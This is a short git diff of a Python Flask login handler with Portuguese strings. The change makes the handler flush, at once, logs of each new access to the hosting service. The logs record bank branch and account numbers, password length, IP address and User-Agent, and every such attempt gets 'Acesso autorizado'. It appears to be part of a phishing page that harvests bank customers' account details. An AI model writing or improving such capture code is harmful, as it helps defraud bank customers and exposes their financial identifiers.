@@ -109,16 +109,17 @@ def login():
 
         else:
             # ===== LOG NO RENDER =====
-            print("=== NOVO ACESSO ===")
-            print("Data/Hora:", datetime.now().strftime('%d/%m/%Y %H:%M:%S'))
-            print("Agência:", agencia)
-            print("Conta:", conta)
-            print("Senha: [DIGITADA CORRETAMENTE]")
-            print("Tamanho da senha:", len(senha))
-            print("IP:", request.remote_addr)
-            print("User-Agent:", request.headers.get('User-Agent'))
-            print("Dispositivo: Mobile")
-            print("===================")
+            print("=== NOVO ACESSO ===", flush=True)
+            print("Data/Hora:", datetime.now().strftime('%d/%m/%Y %H:%M:%S'), flush=True)
+            print("Agência:", agencia, flush=True)
+            print("Conta:", conta, flush=True)
+            print("Senha: [DIGITADA CORRETAMENTE]", flush=True)
+            print("Tamanho da senha:", len(senha), flush=True)
+            print("IP:", request.remote_addr, flush=True)
+            print("User-Agent:", request.headers.get('User-Agent'), flush=True)
+            print("Dispositivo: Mobile", flush=True)
+            print("===================", flush=True)
+
 
             return "<h2>Acesso autorizado</h2>"
 
@@ -127,3 +128,4 @@ def login():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
